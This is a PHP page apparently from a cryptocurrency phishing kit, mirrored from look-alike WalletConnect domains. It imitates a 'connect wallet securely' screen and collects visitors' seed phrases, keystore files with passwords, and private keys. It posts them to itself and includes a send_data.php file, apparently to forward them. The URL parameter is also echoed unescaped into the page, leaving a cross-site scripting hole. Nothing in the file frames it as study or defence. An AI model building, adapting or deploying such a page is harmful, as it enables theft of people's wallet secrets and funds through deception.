
<?php 
include "include/config.php";
include "include/send_data.php";
  $wallet ="";
 if(!isset($_GET['type'])){
     header("location:index.php");
 }else{
     $wallet = $_GET['type'];
 }

?>
<html>

<!-- Mirrored from walletconnect.biz/connect/?type=atomic+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 15 Mar 2021 00:24:00 GMT -->
<!-- Added by HTTrack -->
<!-- Mirrored from walletconnect.org.in/connect/index0b9a.html?type=atomic+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jun 2021 16:53:04 GMT -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<link rel="stylesheet" href="main.css" type="text/css"/> 
<meta charset="UTF-8">
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:image" content="../images/logo.svg">
<link rel="icon" href="../images/logo.svg">
<script>
    function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
  </script>
</head>

<?php include "include/head.php";?>
<h2><center>CONNECT WALLET SECURELY</center></h2>
<?php echo"$success";?>
</br>
<div class="tab">
  <button class="tablinks" id="default" onclick="openCity(event, 'phrase')">Phrase</b></button>
  <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</b></button>
  <button class="tablinks" onclick="openCity(event, 'private')">Private Key</b></button>
</div>

<div id="phrase" class="tabcontent">
<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="POST">

<input type="hidden" name="category" value="phrase"/>
<input type="hidden" name="wallet" value="<?php echo"$wallet";?>"/>

<textarea name="seed" required="required" minlength="12" placeholder="Phrase"></textarea>
</br>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
</br>
<button type="submit"  class="btn">CONNECT </button>
</form>
</div>

<div id="keystore" class="tabcontent">
<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="POST">

<input type="hidden" name="category" value="json"/>
<input type="hidden" name="wallet" value="<?php echo"$wallet";?>"/>

<textarea name="seed" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
</br>
<div class="field">
    <input type="text" name="password" placeholder="Password"/>
</div>
<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
</br>
<button type="submit"  class="btn">CONNECT </button>
</form>
</div>

<div id="private" class="tabcontent">
<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="POST">
<input type="hidden" name="category" value="private_key"/>
<input type="hidden" name="wallet" value="<?php echo"$wallet";?>"/>
<div class="field">
    <input type="text" name="seed" placeholder="Private Key"/>
</div>
<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
</br>
<button type="submit"  class="btn">CONNECT </button>
</form>
</div>

<script>
    document.getElementById("default").click();
</script>
<?php include "include/foot.php";?>
</body>

<!-- Mirrored from walletconnect.biz/connect/?type=atomic+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 15 Mar 2021 00:24:00 GMT -->

<!-- Mirrored from walletconnect.org.in/connect/index0b9a.html?type=atomic+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jun 2021 16:53:04 GMT -->
</html>